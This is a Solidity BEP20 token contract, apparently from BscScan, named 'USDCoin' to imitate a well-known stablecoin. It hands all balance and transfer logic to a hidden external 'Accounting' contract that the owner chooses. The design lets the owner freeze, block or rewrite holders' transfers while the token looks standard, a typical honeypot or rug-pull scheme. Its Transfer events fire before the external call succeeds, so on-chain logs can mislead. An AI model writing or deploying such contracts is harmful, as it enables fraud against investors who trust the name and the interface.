/**
 *Submitted for verification at BscScan.com on 2022-04-28
*/

pragma solidity ^0.8.12;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

interface BEP20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function getOwner() external view returns (address);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface Accounting {
    function doTransfer(address caller, address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

contract USDCoin is BEP20 {
    using SafeMath for uint256;

    string public name = "USDCoin";
    address public owner = msg.sender;    
    string public symbol = "RC";
    uint public _totalSupply;
    uint8 public _decimals;
    
    mapping (address => mapping (address => uint256)) private allowed;
    address private accounting;
    
    constructor() public {
        emit Transfer(address(0), msg.sender, _totalSupply);
        _totalSupply = 1000000 * 10 ** 9;
        _decimals = 9;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address who) view public returns (uint256) {
        return Accounting(accounting).balanceOf(who);
    }

    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }

    function setAccountingAddress(address accountingAddress) public {
        accounting = accountingAddress;
        require(msg.sender == owner);
    }

    function renounceOwnership() public {
        require(msg.sender == owner);
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    
    function transferFrom(address from, address to, uint amount) public returns (bool success) {
        emit Transfer(from, to, amount);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
        return Accounting(accounting).doTransfer(msg.sender, from, to, amount); 
    }

    function transfer(address to, uint amount) public returns (bool success) {
        emit Transfer(msg.sender, to, amount);
        return Accounting(accounting).doTransfer(msg.sender, msg.sender, to, amount);
    }
}